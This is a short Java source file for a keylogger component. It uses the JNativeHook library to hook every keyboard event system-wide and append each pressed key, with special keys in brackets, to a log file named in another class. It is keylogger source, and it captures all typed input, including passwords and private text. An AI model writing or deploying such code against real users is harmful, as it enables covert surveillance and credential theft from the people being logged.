import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.StandardOpenOption;

public class KeyListener implements NativeKeyListener {

    public void nativeKeyPressed(NativeKeyEvent e) {
        String KeyText=NativeKeyEvent.getKeyText(e.getKeyCode());

        System.out.print(NativeKeyEvent.getKeyText(e.getKeyCode()));
        //create File.txt Record any Thing Write in Keyboard
            try (OutputStream os=Files.newOutputStream(MainController.file, StandardOpenOption.CREATE,StandardOpenOption.WRITE
            ,StandardOpenOption.APPEND);  PrintWriter writer=new PrintWriter(os)){
                if (KeyText.length()>1){
                    writer.print("["+KeyText+"]");
                }else {
                    writer.print(KeyText);
                }

            } catch (IOException ex) {
                throw new RuntimeException(ex);
            }

    }
}